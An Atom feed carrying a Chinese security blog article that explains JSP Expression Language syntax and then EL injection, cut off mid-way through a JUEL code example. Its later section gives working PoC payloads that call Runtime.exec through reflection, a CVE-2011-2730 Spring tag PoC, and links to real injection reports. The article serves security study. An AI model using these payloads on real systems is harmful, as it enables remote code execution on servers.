<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Devils In The Detail.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-05-10T16:01:44.614Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>（先知首发）浅析EL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/26/浅析EL表达式注入漏洞/</id>
    <published>2020-04-25T16:05:47.000Z</published>
    <updated>2020-05-10T16:01:44.614Z</updated>
    
    <content type="html"><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p><h2 id="0x01-EL简介"><a href="#0x01-EL简介" class="headerlink" title="0x01 EL简介"></a>0x01 EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p><p>EL表达式主要功能如下：</p><ul><li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li><li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>${user==null}</code>；</li><li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li><li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li></ul><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><h3 id="EL语法"><a href="#EL语法" class="headerlink" title="EL语法"></a>EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以<code>${}</code>表示。例如，<code>${ userinfo}</code>代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：<code>${ pageScope. userinfo}</code>表示访问page范围中的userinfo变量。</p><p>简单地说，使用EL表达式语法：<code>${EL表达式}</code></p><p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p><p>扩展JSP代码的写法总结：</p><ul><li><p>JSP表达式：<code>&lt;%=变量或表达式&gt;</code></p><p>向浏览器输出变量或表达式的计算结果。</p></li><li><p>JSP脚本：<code>&lt;%Java代码%&gt;</code></p><p>执行java代码的原理：翻译到_jspService()方法中。</p></li><li><p>JSP声明：<code>&lt;%!变量或方法%&gt;</code></p><p>声明jsp的成员变量或成员方法。</p></li><li><p>JSP注释：<code>&lt;%!--JSP注释--%&gt;</code></p><p>用于注释JSP代码，不会翻译到Java文件中，也不会执行。</p></li></ul><h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code>。例如：<code>${user.My-Name}</code>应当改为<code>${user[&quot;My-Name&quot;]}</code>。</p><p>如果要动态取值时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值。例如：<code>${sessionScope.user[data]}</code>中data 是一个变量。</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>EL表达式存取变量数据的方法很简单，例如：<code>${username}</code>。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下：</p><table><thead><tr><th>属性范围在EL中的名称</th><th></th></tr></thead><tbody><tr><td>Page</td><td>PageScope</td></tr><tr><td>Request</td><td>RequestScope</td></tr><tr><td>Session</td><td>SessionScope</td></tr><tr><td>Application</td><td>ApplicationScope</td></tr></tbody></table><p>JSP表达式语言定义可在表达式中使用的以下文字：</p><table><thead><tr><th style="text-align:left">文字</th><th style="text-align:left">文字的值</th></tr></thead><tbody><tr><td style="text-align:left">Boolean</td><td style="text-align:left">true 和 false</td></tr><tr><td style="text-align:left">Integer</td><td style="text-align:left">与 Java 类似。可以包含任何整数，例如 24、-45、567</td></tr><tr><td style="text-align:left">Floating Point</td><td style="text-align:left">与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td></tr><tr><td style="text-align:left">String</td><td style="text-align:left">任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td></tr><tr><td style="text-align:left">Null</td><td style="text-align:left">null</td></tr></tbody></table><h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">算术型</td><td style="text-align:left">+、-（二元）、*、/、div、%、mod、-（一元）</td></tr><tr><td style="text-align:left">逻辑型</td><td style="text-align:left">and、&amp;&amp;、or、双管道符、!、not</td></tr><tr><td style="text-align:left">关系型</td><td style="text-align:left">==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td></tr><tr><td style="text-align:left">空</td><td style="text-align:left">empty 空操作符是前缀操作，可用于确定值是否为空。</td></tr><tr><td style="text-align:left">条件型</td><td style="text-align:left">A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td></tr></tbody></table><h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>pageContext</td><td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>${pageContext.response}</code>为页面的响应对象赋值。</td></tr></tbody></table><p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">param</td><td style="text-align:left">将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>${param . name}</code>相当于 request.getParameter (name)。</td></tr><tr><td style="text-align:left">paramValues</td><td style="text-align:left">将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>${paramvalues. name}</code> 相当于 request.getParamterValues(name)。</td></tr><tr><td style="text-align:left">header</td><td style="text-align:left">将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>${header. name}</code> 相当于 request.getHeader(name)。</td></tr><tr><td style="text-align:left">headerValues</td><td style="text-align:left">将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>${headerValues. name}</code>相当于 request.getHeaderValues(name)。</td></tr><tr><td style="text-align:left">cookie</td><td style="text-align:left">将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>${cookie. name .value}</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>${headerValues. name}</code>表达式。</td></tr><tr><td style="text-align:left">initParam</td><td style="text-align:left">将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td></tr></tbody></table><p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">pageScope</td><td style="text-align:left">将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>${pageScope.objectName}</code>访问一个 JSP 中页面范围的对象，还可以使用<code>${pageScope .objectName. attributeName}</code>访问对象的属性。</td></tr><tr><td style="text-align:left">requestScope</td><td style="text-align:left">将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>${requestScope. objectName}</code>访问一个 JSP 请求范围的对象，还可以使用<code>${requestScope. objectName. attributeName}</code>访问对象的属性。</td></tr><tr><td style="text-align:left">sessionScope</td><td style="text-align:left">将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>${sessionScope. name}</code></td></tr><tr><td style="text-align:left">applicationScope</td><td style="text-align:left">将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td></tr></tbody></table><h4 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/1.png" alt=""></p><h4 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p><p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">    pageContext.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_page"</span>);  </span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_request"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_session"</span>);</span><br><span class="line">    application.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_application"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/5.png" alt=""></p><h4 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p><p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p><p>接下来的例子表明了如何访问request中的username参数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"Accessing Request Param"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param["username"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/2.png" alt=""></p><h4 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p><p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：<code>${header.user-agent}</code>，或者<code>${header[&quot;user-agent&quot;]}</code>。</p><p>接下来的例子表明了如何访问user-agent信息头：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"User Agent Example"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header["user-agent"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/3.png" alt=""></p><p>header对象返回单一值，而headerValues则返回一个字符串数组。</p><h3 id="EL中的函数"><a href="#EL中的函数" class="headerlink" title="EL中的函数"></a>EL中的函数</h3><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure><p>ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;fn:length(&quot;Get my length&quot;)&#125;</span><br></pre></td></tr></table></figure><p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库。</p><h3 id="EL表达式调用Java方法"><a href="#EL表达式调用Java方法" class="headerlink" title="EL表达式调用Java方法"></a>EL表达式调用Java方法</h3><p>看个例子即可。</p><p>先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ELFunc</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doSomething</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str + <span class="string">".com"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>ELFunc<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://www.mi1k7ea.com/ELFunc<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>doSomething<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>eltest.ELFunc<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span> java.lang.String doSomething(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> uri=<span class="string">"http://www.mi1k7ea.com/ELFunc"</span> prefix=<span class="string">"ELFunc"</span>%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(<span class="string">"mi1k7ea"</span>)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/6.png" alt=""></p><h2 id="0x03-JSP中启动-禁用EL表达式"><a href="#0x03-JSP中启动-禁用EL表达式" class="headerlink" title="0x03 JSP中启动/禁用EL表达式"></a>0x03 JSP中启动/禁用EL表达式</h2><h3 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br></pre></td></tr></table></figure><p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p><p>JSP2.0中默认的启用EL表达式。</p><p>例如如下的JSP代码禁用EL表达式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/4.png" alt=""></p><h2 id="0x04-EL表达式注入漏洞"><a href="#0x04-EL表达式注入漏洞" class="headerlink" title="0x04 EL表达式注入漏洞"></a>0x04 EL表达式注入漏洞</h2><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p><p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p><h3 id="通用PoC"><a href="#通用PoC" class="headerlink" title="通用PoC"></a>通用PoC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line">//获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line"></span><br><span class="line">//文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line">//获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line">//执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>比如我们在Java程序中可以控制输入EL表达式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure><p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p><p><img src="/2020/04/26/浅析EL表达式注入漏洞/11.png" alt=""></p><p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p><h3 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h3><p>命令执行PoC如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring:message text=</span><br><span class="line"><span class="string">"$&#123;/"</span>/<span class="string">".getClass().forName(/"</span>java.lang.Runtime/<span class="string">").getMethod(/"</span>getRuntime/<span class="string">",null).invoke(null,null).exec(/"</span>calc/<span class="string">",null).toString()&#125;"</span>&gt;</span><br><span class="line">&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">"http://www.springframework.org/tags"</span> prefix=<span class="string">"spring"</span>%&gt;</span><br><span class="line">&lt;spring:message  text="$&#123;param.a&#125;"&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure><p>访问<code>http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}</code>。</p><p>容器第一次执行EL表达式<code>${param.a}</code>获得了我们输入的<code>${applicationScope}</code>，然后Spring标签获取容器的EL表达式求值对象，把<code>${applicationScope}</code>再次执行掉，形成了漏洞。</p><h3 id="Wooyun案例"><a href="#Wooyun案例" class="headerlink" title="Wooyun案例"></a>Wooyun案例</h3><p>参考Wooyun镜像上的案例：</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0195845.html" target="_blank" rel="noopener">搜狗某系统存在远程EL表达式注入漏洞(命令执行)</a></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196160.html" target="_blank" rel="noopener">工商银行某系统存在远程EL表达式注入漏洞(命令执行)</a></p><h3 id="JUEL示例"><a href="#JUEL示例" class="headerlink" title="JUEL示例"></a>JUEL示例</h3><p>下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。</p><p>EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！</p><p>也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。</p><p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p><p>更多参考官网：<a href="http://juel.sourceforge.net/" target="_blank" rel="noopener">http://juel.sourceforge.net/</a></p><p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p><p>Test.java，利用反射调用Runtime类方法实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionFactory expressionFactory = <span class="keyword">new</span> ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = <span class="keyword">new</span> SimpleContext();</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;";</span></span><br><span class="line">        <span class="comment">// ok</span></span><br><span class="line">        String exp = <span 